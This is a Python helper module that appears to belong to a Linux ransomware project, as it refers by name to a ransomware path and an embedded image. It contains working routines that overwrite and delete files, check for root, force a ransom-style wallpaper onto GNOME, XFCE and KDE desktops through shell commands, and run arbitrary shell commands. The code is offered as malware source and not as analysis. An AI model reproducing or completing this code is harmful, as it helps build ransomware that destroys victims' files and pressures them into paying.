import variables
import base64

import string
import random
import os
import subprocess

def shred(file_name,  passes=1):
    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    if (not os.path.isfile(file_name)):
        return False

    ld = os.path.getsize(file_name)
    with open(file_name,  "w") as fh:
        for _ in range(int(passes)):
            data = generate_data(ld)
            fh.write(data)
            fh.seek(0,  0)
    os.remove(file_name)
    

def amiroot(): 
    return True if os.getuid() == 0 else False


def change_wallpaper():
    with open(os.path.join(variables.ransomware_path, "img.png"), 'wb') as f:
        f.write(base64.b64decode(variables.img))
    gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
            .format(os.path.join(variables.ransomware_path, "img.png"))
    
    xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" '''\
            .format(os.path.join(variables.ransomware_path, "img.png"))
    xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"'\
            .format(os.path.join(variables.ransomware_path, "img.png"))

    kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
var Desktops = desktops();                                                                                                                       
for (i=0;i<Desktops.length;i++) {
        d = Desktops[i];
        d.wallpaperPlugin = "org.kde.image";
        d.currentConfigGroup = Array("Wallpaper",
                                    "org.kde.image",
                                    "General");
        d.writeConfig("Image", "file://%s");
}'
""" %(os.path.join(variables.ransomware_path, "img.png"))
    os.system(gnome)
    os.system(xfce)
    os.system(xfce1)
    os.system(kde)
    
    
def run_subprocess(command):
    subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)